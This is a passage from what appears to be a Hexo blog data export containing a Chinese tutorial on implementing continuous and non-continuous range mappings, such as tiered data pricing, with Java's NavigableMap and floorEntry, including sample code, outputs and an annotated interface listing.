calculate(values);\n    }\n    \n    private void calculate(List<Integer> values) {\n        for (Integer value : values) {\n            Entry<Integer, Pair<Integer, Integer>> entry = ranges.floorEntry(value);\n            Pair<Integer, Integer> pair = entry.getValue();\n            if (value < pair.getKey()) {\n                System.out.println(\"值:\" + value + \"\\t -> 范围:[\" + entry.getKey() + \",\" + pair.getKey()  + \")\\t值:\" + pair.getValue());\n            } else {\n                System.out.println(\"值:\" + value + \"\\t -> 未包含的范围\");\n            }\n        }\n    }\n}\n```\n\n#### 执行结果\n``` bash\n值:2\t -> 范围:[0,3)\t值:0\n值:3\t -> 未包含的范围\n值:7\t -> 范围:[5,10)\t值:1\n值:10\t -> 未包含的范围\n值:100\t -> 范围:[100,200)\t值:2\n值:150\t -> 范围:[100,200)\t值:2\n值:300\t -> 未包含的范围\n```\n\n\n## 四、小结\n范围映射实现的核心类：java.util.NavigableMap\n\n### 1. 常用方法\n| 方法 | 说明 |\n|---|---|\n| floorEntry | 返回小于等于指定key中的所有key中最大的一个key |\n| ceilingEntry | 返回大于等于指定key中的所有key中最小的一个key |\n| lowerEntry | 返回小于指定key中的所有key总最大的一个key |\n| higherEntry | 返回大于指定key中的所有key中最小的一个key |\n\n### 2. 详解说明\n``` java\npublic interface NavigableMap<K, V> extends SortedMap<K, V> {\n    // 获取小于指定key的第一个节点对象\n    Map.Entry<K, V> lowerEntry(K key);\n\n    // 获取小于指定key的第一个key\n    K lowerKey(K key);\n\n    // 获取小于或等于指定key的第一个节点对象\n    Map.Entry<K, V> floorEntry(K key);\n\n    // 获取小于或等于指定key的第一个key\n    K floorKey(K key);\n\n    // 获取大于或等于指定key的第一个节点对象\n    Map.Entry<K, V> ceilingEntry(K key);\n\n    // 获取大于或等于指定key的第一个key\n    K ceilingKey(K key);\n\n    // 获取大于指定key的第一个节点对象\n    Map.Entry<K, V> higherEntry(K key);\n\n    // 获取大于指定key的第一个key\n    K higherKey(K key);\n\n    // 获取Map的第一个（最小的）节点对象\n    Map.Entry<K, V> firstEntry();\n\n    // 获取Map的最后一个（最大的）节点对象\n    Map.Entry<K, V> lastEntry();\n\n    // 获取Map的第一个节点对象，并从Map中移除改节点\n    Map.Entry<K, V> pollFirstEntry();\n\n    // 获取Map的最后一个节点对象，并从Map中移除改节点\n    Map.Entry<K, V> pollLastEntry();\n\n    // 返回当前Map的逆序Map集合\n    NavigableMap<K, V> descendingMap();\n\n    // 返回当前Map中包含的所有key的Set集合\n    NavigableSet<K> navigableKeySet();\n\n    // 返回当前map的逆序Set集合，Set由key组成\n    NavigableSet<K> descendingKeySet();\n\n    // 返回当前map中介于fromKey（fromInclusive是否包含）和toKey（toInclusive是否包含） 之间的子map\n    NavigableMap<K, V> subMap(K fromKey, boolean fromInclusive, K toKey, boolean toInclusive);\n\n    // 返回介于map第一个元素到toKey（inInclusive是否包含）之间的子map\n    NavigableMap<K, V> headMap(K toKey, boolean inclusive);\n\n    // 返回当前map中介于fromKey（inInclusive是否包含） 到map最后一个元素之间的子map\n    NavigableMap<K, V> tailMap(K fromKey, boolean inclusive);\n\n    // 返回当前map中介于fromKey（包含）和toKey（不包含）之间的子map\n    SortedMap<K, V> subMap(K fromKey, K toKey);\n\n    // 返回介于map第一个元素到toKey（不包含）之间的子map\n    SortedMap<K, V> headMap(K toKey);\n\n    // 返回当前map中介于fromKey（包含） 到map最后一个元素之间的子map\n    SortedMap<K, V> tailMap(K fromKey);\n}\n```\n\n\n## 五、参考文档\n1. [Using java map for range searches](http://stackoverflow.com/questions/1314650/using-java-map-for-range-searches/1314708#1314708)\n2. [给jdk写注释系列之jdk1.6容器(8)：TreeSet、NavigableMap、NavigableSet源码解析](http://www.importnew.com/17620.html)\n3. [Java集合<10> (NavigableMap)](http://my.oschina.net/kevinair/blog/191242)\n\n","slug":"article/java/java范围映射","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxrp002r5nbt99ui8xuk","content":"<p><img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>近期一个功能开发涉及到一个核心业务规则为：根据消费额实行阶梯计价，额度处于的阶梯档位不同，对应的单价不同，需要根据给定的消费额找到对应的消费单价。</p>\n<h2 id=\"二、问题分析\"><a href=\"#二、问题分析\" class=\"headerlink\" title=\"二、问题分析\"></a>二、问题分析</h2><p>阶梯计价翻译成编码逻辑，先容易想到是一个映射，即：Map。<br>不过特殊的地方在于，这是一个范围映射，将一个范围的键值映射到一个固定的值。<br>下来我们来看一下这种范围映射逻辑如何使用java程序来表现。</p>\n<h2 id=\"三、范围映射分类\"><a href=\"#三、范围映射分类\" class=\"headerlink\" title=\"三、范围映射分类\"></a>三、范围映射分类</h2><p>范围映射按其连续性，可以简单分为如下两类情形：</p>\n<h3 id=\"1-连续的范围映射\"><a href=\"#1-连续的范围映射\" class=\"headerlink\" title=\"1. 连续的范围映射\"></a>1. 连续的范围映射</h3><p>例如：计价阶梯就是连续的范围映射。<br>大多数情况下，计价阶梯都是连续的情况。</p>\n<h4 id=\"场景举例\"><a href=\"#场景举例\" class=\"headerlink\" title=\"场景举例\"></a>场景举例</h4><p>举个大家都熟悉的场景：北京移动套餐外流量资费。这一流量资费在某个时期就是阶梯计价的，消费阶梯是连续的。<br>具体的阶梯计价映射关系如下：</p>\n<table>\n<thead>\n<tr>\n<th>流量消费阶梯</th>\n<th>流量单价</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[0,100MB)</td>\n<td>0.15元/MB</td>\n</tr>\n<tr>\n<td>[100MB,500MB)</td>\n<td>0.08元/MB</td>\n</tr>\n<tr>\n<td>[500MB,1GB)</td>\n<td>0.05元/MB</td>\n</tr>\n<tr>\n<td>[1GB,2GB)</td>\n<td>0.04元/MB</td>\n</tr>\n<tr>\n<td>[2GB,15GB)</td>\n<td>0.03元/MB</td>\n</tr>\n<tr>\n<td>[15GB,∞)</td>\n<td>0.01元/MB</td>\n</tr>\n</tbody>\n</table>\n<a id=\"more\"></a>\n<h4 id=\"实现代码\"><a href=\"#实现代码\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">package</span> cn.yeshaoting.demo;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> java.util.List;</div><div class=\"line\"><span class=\"keyword\">import</span> java.util.Map.Entry;</div><div class=\"line\"><span class=\"keyword\">import</span> java.util.NavigableMap;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> org.junit.Before;</div><div class=\"line\"><span class=\"keyword\">import</span> org.junit.Test;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> com.google.common.collect.Lists;</div><div class=\"line\"><span class=\"keyword\">import</span> com.google.common.collect.Maps;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * <span class=\"doctag\">@description</span> 阶梯计价</div><div class=\"line\"> * <span class=\"doctag\">@author</span> yeshaoting</div><div class=\"line\"> * <span class=\"doctag\">@date</span> Aug 8, 2016 12:26:39 PM</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SteppedCalculateTest</span> </span>&#123;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 流量下界阶梯</span></div><div class=\"line\">    <span class=\"keyword\">private</span> NavigableMap&lt;Integer, Double&gt; steppedFloorFlows = Maps.newTreeMap();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> GB = <span class=\"number\">1000</span>;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"meta\">@Before</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span> </span>&#123;</div><div class=\"line\">        steppedFloorFlows.put(<span class=\"number\">0</span>, <span class=\"number\">0.15</span>);</div><div class=\"line\">        steppedFloorFlows.put(<span class=\"number\">100</span>, <span class=\"number\">0.08</span>);</div><div class=\"line\">        steppedFloorFlows.put(<span class=\"number\">500</span>, <span class=\"number\">0.05</span>);</div><div class=\"line\">        steppedFloorFlows.put(GB * <span class=\"number\">1</span>, <span class=\"number\">0.04</span>);</div><div class=\"line\">        steppedFloorFlows.put(GB * <span class=\"number\">2</span>, <span class=\"number\">0.03</span>);</div><div class=\"line\">        steppedFloorFlows.put(GB * <span class=\"number\">15</span>, <span class=\"number\">0.01</span>);</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"meta\">@Test</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">continuousStepTest</span><span class=\"params\">()</span> </span>&#123;</div><div class=\"line\">        List&lt;Integer&gt; flows = Lists.newArrayList(<span class=\"number\">70</span>, <span class=\"number\">100</span>, <span class=\"number\">200</span>, <span class=\"number\">500</span>, GB * <span class=\"number\">20</span>);</div><div class=\"line\">        calculate(flows);</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">calculate</span><span class=\"params\">(List&lt;Integer&gt; flows)</span> </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">for</span> (Integer flow : flows) &#123;</div><div class=\"line\">            Entry&lt;Integer, Double&gt; entry = steppedFloorFlows.floorEntry(flow);</div><div class=\"line\">            System.out.println(<span class=\"string\">\"消费额:\"</span> + flow + <span class=\"string\">\"MB\\t -&gt; 档位:\"</span> + entry.getKey() + <span class=\"string\">\"\\t单价:\"</span> + entry.getValue());</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h4 id=\"执行结果\"><a href=\"#执行结果\" class=\"headerlink\" title=\"执行结果\"></a>执行结果</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">消费额:70\t -&gt; 档位:0\t单价:0.15</div><div class=\"line\">消费额:100\t -&gt; 档位:100\t单价:0.08</div><div class=\"line\">消费额:200\t -&gt; 档位:100\t单价:0.08</div><div class=\"line\">消费额:500\t -&gt; 档位:500\t单价:0.05</div><div class=\"line\">消费额:20000\t -&gt; 档位:15000\t单价:0.03</div></pre></td></tr></table></figure>\n<h3 id=\"2-不连续的范围映射\"><a href=\"#2-不连续的范围映射\" class=\"headerlink\" title=\"2. 不连续的范围映射\"></a>2. 不连续的范围映射</h3><p>某些特殊的业务场景需要实现不连续的范围映射。</p>\n<h4 id=\"范围映射\"><a href=\"#范围映射\" class=\"headerlink\" title=\"范围映射\"></a>范围映射</h4><table>\n<thead>\n<tr>\n<th>范围</th>\n<th>值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[0,3)</td>\n<td>0</td>\n</tr>\n<tr>\n<td>[5,10)</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[100,200)</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"实现代码-1\"><a href=\"#实现代码-1\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">package</span> cn.yeshaoting.demo;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> java.util.List;</div><div class=\"line\"><span class=\"keyword\">import</span> java.util.Map.Entry;</div><div class=\"line\"><span class=\"keyword\">import</span> java.util.NavigableMap;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.lang3.tuple.Pair;</div><div class=\"line\"><span class=\"keyword\">import</span> org.junit.Before;</div><div class=\"line\"><span class=\"keyword\">import</span> org.junit.Test;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> com.google.common.collect.Lists;</div><div class=\"line\"><span class=\"keyword\">import</span> com.google.common.collect.Maps;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * <span class=\"doctag\">@description</span> 范围映射</div><div class=\"line\"> * <span class=\"doctag\">@author</span> yeshaoting</div><div class=\"line\"> * <span class=\"doctag\">@date</span> Aug 8, 2016 12:26:39 PM</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RangeCalculateTest</span> </span>&#123;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 范围映射</span></div><div class=\"line\">    <span class=\"keyword\">private</span> NavigableMap&lt;Integer, Pair&lt;Integer, Integer&gt;&gt; ranges = Maps.newTreeMap();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"meta\">@Before</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span> </span>&#123;</div><div class=\"line\">        ranges.put(<span class=\"number\">0</span>, Pair.of(<span class=\"number\">3</span>, <span class=\"number\">0</span>));       <span class=\"comment\">// 0..3     =&gt; 0</span></div><div class=\"line\">        ranges.put(<span class=\"number\">5</span>, Pair.of(<span class=\"number\">10</span>, <span class=\"number\">1</span>));      <span class=\"comment\">// 5..10    =&gt; 1</span></div><div class=\"line\">        ranges.put(<span class=\"number\">100</span>, Pair.of(<span class=\"number\">200</span>, <span class=\"number\">2</span>));   <span class=\"comment\">// 100..200 =&gt; 2</span></div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"meta\">@Test</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">uncontinuousStepTest</span><span class=\"params\">()</span> </span>&#123;</div><div class=\"line\">        List&lt;Integer&gt; values = Lists.newArrayList(<span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">10</span>, <span class=\"number\">100</span>, <span class=\"number\">150</span>, <span class=\"number\">300</span>);</div><div class=\"line\">        calculate(values);</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">calculate</span><span class=\"params\">(List&lt;Integer&gt; values)</span> </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">for</span> (Integer value : values) &#123;</div><div class=\"line\">            Entry&lt;Integer, Pair&lt;Integer, Integer&gt;&gt; entry = ranges.floorEntry(value);</div><div class=\"line\">            Pair&lt;Integer, Integer&gt; pair = entry.getValue();</div><div class=\"line\">            <span class=\"keyword\">if</span> (value &lt; pair.getKey()) &#123;</div><div class=\"line\">                System.out.println(<span class=\"string\">\"值:\"</span> + value + <span class=\"string\">\"\\t -&gt; 范围:[\"</span> + entry.getKey() + <span class=\"string\">\",\"</span> + pair.getKey()  + <span class=\"string\">\")\\t值:\"</span> + pair.getValue());</div><div class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">                System.out.println(<span class=\"string\">\"值:\"</span> + value + <span class=\"string\">\"\\t -&gt; 未包含的范围\"</span>);</div><div class=\"line\">            &#125;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h4 id=\"执行结果-1\"><a href=\"#执行结果-1\" class=\"headerlink\" title=\"执行结果\"></a>执行结果</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">值:2\t -&gt; 范围:[0,3)\t值:0</div><div class=\"line\">值:3\t -&gt; 未包含的范围</div><div class=\"line\">值:7\t -&gt; 范围:[5,10)\t值:1</div><div class=\"line\">值:10\t -&gt; 未包含的范围</div><div class=\"line\">值:100\t -&gt; 范围:[100,200)\t值:2</div><div class=\"line\">值:150\t -&gt; 范围:[100,200)\t值:2</div><div class=\"line\">值:300\t -&gt; 未包含的范围</div></pre></td></tr></table></figure>\n<h2 id=\"四、小结\"><a href=\"#四、小结\" class=\"headerlink\" title=\"四、小结\"></a>四、小结</h2><p>范围映射实现的核心类：java.util.NavigableMap</p>\n<h3 id=\"1-常用方法\"><a href=\"#1-常用方法\" class=\"headerlink\" title=\"1. 常用方法\"></a>1. 常用方法</h3><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>floorEntry</td>\n<td>返回小于等于指定key中的所有key中最大的一个key</td>\n</tr>\n<tr>\n<td>ceilingEntry</td>\n<td>返回大于等于指定key中的所有key中最小的一个key</td>\n</tr>\n<tr>\n<td>lowerEntry</td>\n<td>返回小于指定key中的所有key总最大的一个key</td>\n</tr>\n<tr>\n<td>higherEntry</td>\n<td>返回大于指定key中的所有key中最小的一个key</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-详解说明\"><a href=\"#2-详解说明\" class=\"headerlink\" title=\"2. 详解说明\"></a>2. 详解说明</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">NavigableMap</span>&lt;<span class=\"title\">K</span>, <span class=\"title\">V</span>&gt; <span class=\"keyword\">extends</span> <span class=\"title\">SortedMap</span>&lt;<span class=\"title\">K</span>, <span class=\"title\">V</span>&gt; </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 获取小于指定key的第一个节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">lowerEntry</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取小于指定key的第一个key</span></div><div class=\"line\">    <span class=\"function\">K <span class=\"title\">lowerKey</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取小于或等于指定key的第一个节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">floorEntry</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取小于或等于指定key的第一个key</span></div><div class=\"line\">    <span class=\"function\">K <span class=\"title\">floorKey</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取大于或等于指定key的第一个节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">ceilingEntry</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取大于或等于指定key的第一个key</span></div><div class=\"line\">    <span class=\"function\">K <span class=\"title\">ceilingKey</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取大于指定key的第一个节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">higherEntry</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取大于指定key的第一个key</span></div><div class=\"line\">    <span class=\"function\">K <span class=\"title\">higherKey</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取Map的第一个（最小的）节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">firstEntry</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取Map的最后一个（最大的）节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">lastEntry</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取Map的第一个节点对象，并从Map中移除改节点</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">pollFirstEntry</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取Map的最后一个节点对象，并从Map中移除改节点</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">pollLastEntry</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前Map的逆序Map集合</span></div><div class=\"line\">    <span class=\"function\">NavigableMap&lt;K, V&gt; <span class=\"title\">descendingMap</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前Map中包含的所有key的Set集合</span></div><div class=\"line\">    <span class=\"function\">NavigableSet&lt;K&gt; <span class=\"title\">navigableKeySet</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前map的逆序Set集合，Set由key组成</span></div><div class=\"line\">    <span class=\"function\">NavigableSet&lt;K&gt; <span class=\"title\">descendingKeySet</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前map中介于fromKey（fromInclusive是否包含）和toKey（toInclusive是否包含） 之间的子map</span></div><div class=\"line\">    <span class=\"function\">NavigableMap&lt;K, V&gt; <span class=\"title\">subMap</span><span class=\"params\">(K fromKey, <span class=\"keyword\">boolean</span> fromInclusive, K toKey, <span class=\"keyword\">boolean</span> toInclusive)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回介于map第一个元素到toKey（inInclusive是否包含）之间的子map</span></div><div class=\"line\">    <span class=\"function\">NavigableMap&lt;K, V&gt; <span class=\"title\">headMap</span><span class=\"params\">(K toKey, <span class=\"keyword\">boolean</span> inclusive)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前map中介于fromKey（inInclusive是否包含） 到map最后一个元素之间的子map</span></div><div class=\"line\">    <span class=\"function\">NavigableMap&lt;K, V&gt; <span class=\"title\">tailMap</span><span class=\"params\">(K fromKey, <span class=\"keyword\">boolean</span> inclusive)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前map中介于fromKey（包含）和toKey（不包含）之间的子map</span></div><div class=\"line\">    <span class=\"function\">SortedMap&lt;K, V&gt; <span class=\"title\">subMap</span><span class=\"params\">(K fromKey, K toKey)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回介于map第一个元素到toKey（不包含）之间的子map</span></div><div class=\"line\">    <span class=\"function\">SortedMap&lt;K, V&gt; <span class=\"title\">headMap</span><span class=\"params\">(K toKey)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前map中介于fromKey（包含） 到map最后一个元素之间的子map</span></div><div class=\"line\">    <span class=\"function\">SortedMap&lt;K, V&gt; <span class=\"title\">tailMap</span><span class=\"params\">(K fromKey)</span></span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><ol>\n<li><a href=\"http://stackoverflow.com/questions/1314650/using-java-map-for-range-searches/1314708#1314708\" target=\"_blank\" rel=\"external\">Using java map for range searches</a></li>\n<li><a href=\"http://www.importnew.com/17620.html\" target=\"_blank\" rel=\"external\">给jdk写注释系列之jdk1.6容器(8)：TreeSet、NavigableMap、NavigableSet源码解析</a></li>\n<li><a href=\"http://my.oschina.net/kevinair/blog/191242\" target=\"_blank\" rel=\"external\">Java集合<10> (NavigableMap)</10></a></li>\n</ol>\n","excerpt":"<p><img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>近期一个功能开发涉及到一个核心业务规则为：根据消费额实行阶梯计价，额度处于的阶梯档位不同，对应的单价不同，需要根据给定的消费额找到对应的消费单价。</p>\n<h2 id=\"二、问题分析\"><a href=\"#二、问题分析\" class=\"headerlink\" title=\"二、问题分析\"></a>二、问题分析</h2><p>阶梯计价翻译成编码逻辑，先容易想到是一个映射，即：Map。<br>不过特殊的地方在于，这是一个范围映射，将一个范围的键值映射到一个固定的值。<br>下来我们来看一下这种范围映射逻辑如何使用java程序来表现。</p>\n<h2 id=\"三、范围映射分类\"><a href=\"#三、范围映射分类\" class=\"headerlink\" title=\"三、范围映射分类\"></a>三、范围映射分类</h2><p>范围映射按其连续性，可以简单分为如下两类情形：</p>\n<h3 id=\"1-连续的范围映射\"><a href=\"#1-连续的范围映射\" class=\"headerlink\" title=\"1. 连续的范围映射\"></a>1. 连续的范围映射</h3><p>例如：计价阶梯就是连续的范围映射。<br>大多数情况下，计价阶梯都是连续的情况。</p>\n<h4 id=\"场景举例\"><a href=\"#场景举例\" class=\"headerlink\" 